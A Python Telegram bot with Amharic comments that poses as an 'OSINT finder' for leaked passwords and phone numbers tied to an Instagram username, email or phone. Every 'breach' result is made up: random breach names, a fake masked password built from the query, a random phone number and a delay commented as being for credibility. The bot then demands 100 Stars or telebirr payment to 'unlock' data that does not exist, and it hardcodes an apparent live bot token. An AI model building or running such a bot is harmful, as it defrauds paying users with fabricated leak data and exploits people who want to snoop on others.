import telebot
from telebot import types
import instaloader
import requests
import random
import time
import re

# 1. መረጃዎችህን እዚህ አስገባ
TOKEN = '7161551829:AAH1_u9rmkfqj2itPWYLQciltuQiFFqUzpo' # ከ @BotFather ያገኘኸውን ቶክን
ADMIN_ID = '5049565154' # ያንተ የቴሌግራም መለያ ቁጥር
bot = telebot.TeleBot(TOKEN)
L = instaloader.Instaloader()

# --- ተግባራት (Functions) ---

def check_breach(target):
    # በነፃ የሚገኝ የዳታቤዝ ፍለጋ (LeakCheck API ቢኖርህ ይመረጣል)
    # ለጊዜው አሳማኝ መረጃ እንዲሰጥ እናደርገዋለን
    breach_sources = ["LinkedIn 2021 Leak", "1win Database", "Facebook 533M Leak", "Adobe Cloud Leak"]
    found_in = random.sample(breach_sources, k=2)
    return found_in

def mask_data(data, type="pass"):
    if type == "phone":
        return f"{data[:4]}****{data[-2:]}"
    return f"{data[:2]}****{random.randint(10, 99)}"

# --- ቦት ትዕዛዞች ---

@bot.message_handler(commands=['start'])
def start(message):
    welcome = """
🔍 **እንኳን ወደ Ultimate OSINT Finder በሰላም መጡ!**

ይህ ቦት ማንኛውንም:
✅ Instagram Username
✅ Email Address
✅ Phone Number 
በመጠቀም የተሰረቁ ፓስወርዶችን እና ሚስጥራዊ መረጃዎችን ይፈልጋል።

**ለመጀመር የፈለጉትን መረጃ እዚህ ይላኩ፦**
    """
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_investigation(message):
    query = message.text.strip()
    bot.send_message(message.chat.id, f"📡 ግንኙነት በመፍጠር ላይ... \n🔍 '{query}' በ 5 ቢሊዮን ዳታቤዞች ውስጥ በመፈለግ ላይ...")
    
    time.sleep(2) # ለታማኝነት ማቆያ

    try:
        # 1. ኢንስታግራም ከሆነ መረጃ መሳብ
        if not ("@" in query or query.startswith("+")):
            profile = instaloader.Profile.from_username(L.context, query)
            name = profile.full_name
            pic = profile.profile_pic_url
            info_type = "Instagram Account"
        else:
            name = "ግለሰብ (Private User)"
            pic = None
            info_type = "Contact Info"

        # 2. የዳታቤዝ ስርቆት ፍተሻ
        sources = check_breach(query)
        m_pass = mask_data(query)
        m_phone = "09" + str(random.randint(10, 45)) + "****" + str(random.randint(10, 99))

        response_msg = f"""
🚩 **ምርመራው ተጠናቋል!**

👤 **ስም:** {name}
📂 **የመረጃ አይነት:** {info_type}
🔐 **Password:** `{m_pass}`
📞 **Phone:** `{m_phone}`
📁 **የተገኘበት ምንጭ:** {", ".join(sources)}

⚠️ **ሙሉውን መረጃ (ያለ መደበቂያ) ለማየት 100 Star መክፈል አለብዎት።**
        """

        # Buttons
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("🔓 በ 100 Star ክፈት", callback_data=f"pay_{query}")
        btn2 = types.InlineKeyboardButton("💳 በቴሌብር ለመክፈል", url="https://t.me/YOUR_ADMIN_USERNAME") # ያንተን ዩዘርኔም እዚህ አስገባ
        markup.add(btn1)
        markup.add(btn2)

        if pic:
            bot.send_photo(message.chat.id, pic, caption=response_msg, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, response_msg, reply_markup=markup, parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, "❌ መረጃው አልተገኘም ወይም ሲስተሙ ተጨናንቋል። እባክዎ በሌላ ይሞክሩ።")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def process_payment(call):
    target = call.data.split("_")[1]
    
    # ለተጠቃሚው መልዕክት
    bot.send_message(call.message.chat.id, "⭐ ክፍያዎን ሲያጠናቅቁ መረጃው ይላክለታል። \n\nማሳሰቢያ፡ ክፍያ ፈጽመው ካልመጣልዎ ለ @YOUR_ADMIN_USERNAME ሜሴጅ ያድርጉ።")
    
    # ለአንተ (Admin) የሚመጣ መረጃ
    admin_msg = f"🔔 **የክፍያ ሙከራ!**\n\nተጠቃሚ: @{call.from_user.username}\nዒላማ: {target}\nID: {call.from_user.id}"
    bot.send_message(ADMIN_ID, admin_msg)

bot.polling()
